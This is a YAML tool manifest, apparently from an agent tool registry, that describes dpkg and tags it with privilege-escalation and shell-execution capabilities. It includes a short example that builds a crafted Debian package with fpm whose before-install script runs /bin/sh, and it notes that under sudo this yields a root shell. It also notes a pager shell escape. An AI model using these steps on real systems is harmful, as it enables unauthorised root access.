---
id: package-dpkg
namespace: package:deb:dpkg
name: dpkg
description: Debian package manager that can spawn shells via crafted package before-install scripts.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
  - system.package.install
  - security.execution.command
platforms:
  - linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - apt
  - apt-get
artifacts: []
workflow_edges:
  produces:
    - shell-access
  consumes:
    - deb-package
contract:
  inputs:
    - type: system.package.deb
      description: Debian package file
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - process_spawn
    - filesystem_write
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: medium
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: medium
allowed-tools:
  - dpkg
  - Bash
  - execFile
parameters:
  - name: i
    type: file
    required: false
    description: "Install a package"
    aliases:
      - -i
  - name: l
    type: string
    required: false
    description: "List installed packages"
    aliases:
      - -l
features:
  - process-manip
execution:
  template: "dpkg {i} {l}"
  sandbox: execFile
  timeout_seconds: 60
  shell: false
global_vars: {}
examples:
  - description: Spawn shell via crafted Debian package with before-install script
    command: |-
      echo 'exec /bin/sh' >x.sh
      fpm -n x -s dir -t deb -a all --before-install x.sh .
      dpkg -i x_1.0_all.deb
  - description: View package list via less pager (can escape to shell)
    command: dpkg -l
references:
  - label: "dpkg man page"
    url: "https://man7.org/linux/man-pages/man1/dpkg.1.html"
techniques:
  - privilege-escalation
  - execution
install:
    - method: apt
      package_name: "dpkg"
      commands:
        - "apt-get install -y dpkg"
---


# dpkg — Debian Package Manager

dpkg installs and manages Debian packages. With sudo, it can install a crafted package containing a `before-install` script that executes arbitrary commands as root.
